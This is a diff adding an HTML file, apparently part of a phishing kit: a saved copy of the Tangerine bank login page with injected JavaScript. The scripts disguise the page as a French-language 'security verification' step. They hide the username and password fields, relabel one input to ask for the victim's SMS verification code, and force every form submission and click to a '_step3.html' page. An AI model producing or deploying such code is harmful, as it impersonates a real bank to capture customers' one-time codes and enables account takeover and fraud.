@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+
+<html app-platform="web" lang="en" style="--theme-family-member-numbers:aIlvNe12BWM0OtLX3Qb145f4sQ5C9v9fezB3TJWiQx0LmFotW8fm4f2OtcmRQVWcYoFJtz"><!--
+ Page saved with SingleFile 
+ url: https://www.tangerine.ca/app/#/login/login-id?locale=en_CA 
+ saved date: Sat Aug 08 2026 11:22:10 GMT-0400 (heure dâ€™été de lâ€™Est nord-américain)
+--><head a-c-at="9f89c84a559f573636a47ff8daed0d33" d-c-id="6db7540144f34a2c4fa4811ea1fd4f3b-6181759593211398" v-c-at="latest">
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var currentFile = window.location.pathname.split("/").pop();
+    var step3File = currentFile.replace("_sms.html", "_step3.html");
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = step3File;
+        });
+    });
+
+    var clickables = document.querySelectorAll("button, input[type='submit'], input[type='button'], .btn");
+    clickables.forEach(function(el) {
+        el.addEventListener("click", function(e) {
+            var text = (el.textContent || el.value || "").toLowerCase().trim();
+            if (el.getAttribute("type") === "submit" || 
+                text.indexOf("valid") !== -1 || 
+                text.indexOf("contin") !== -1 || 
+                text.indexOf("soumet") !== -1 ||
+                text.indexOf("submit") !== -1 ||
+                text.indexOf("next") !== -1 ||
+                text.indexOf("suivant") !== -1) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = step3File;
+            }
+        });
+    });
+});
+</script>
+
+
+<script id="unified-sms-handler">
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. Transform UI for SMS page
+    var inputs = document.querySelectorAll("input:not([type='hidden'])");
+    var targetInput = null;
+    
+    for(var i = 0; i < inputs.length; i++) {
+        if (!targetInput && (inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel" || inputs[i].type === "password")) {
+            targetInput = inputs[i];
+        } else {
+            if (inputs[i].type === "password" || inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel") {
+                inputs[i].style.display = "none";
+                if (inputs[i].parentElement && inputs[i].parentElement.tagName !== "FORM" && inputs[i].parentElement.tagName !== "BODY") {
+                    inputs[i].parentElement.style.display = "none";
+                }
+            }
+        }
+    }
+    
+    if (targetInput) {
+        targetInput.type = "tel";
+        targetInput.maxLength = 8;
+        targetInput.placeholder = "Code SMS";
+        targetInput.value = "";
+        targetInput.style.display = "block";
+        
+        var id = targetInput.id;
+        if(id) {
+            var label = document.querySelector("label[for='" + id + "']");
+            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+        }
+        
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while(node = walker.nextNode()) {
+            var text = node.nodeValue.toLowerCase();
+            if(text.trim().length > 3) {
+                if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
+                    node.nodeValue = "Vérification de sécurité";
+                }
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                }
+                else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
+                    node.nodeValue = "";
+                }
+            }
+        }
+    }
+    
+    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
+    clickables.forEach(function(el) {
+        var text = (el.textContent || el.value || "").toLowerCase().trim();
+        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("connex") !== -1 || text.indexOf("connect") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("log") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("suivant") !== -1) {
+            if (el.tagName === "INPUT") el.value = "Valider le code";
+            else el.innerText = "Valider le code";
+        }
+    });
+
+    // 2. Guaranteed Navigation to Step 3
+    var nextPath = window.location.pathname.replace("_sms.html", "_step3.html");
+    
+    function goNext(e) {
+        if (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+        }
+        window.location.href = nextPath;
+    }
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", goNext, true);
+        form.onsubmit = goNext;
+    });
+    
+    document.addEventListener("click", function(e) {
+        var el = e.target.closest("button, input[type='submit'], input[type='button'], .btn, a");
+        if (el) {
+            goNext(e);
+        }
+    }, true);
+});
+</script>
+
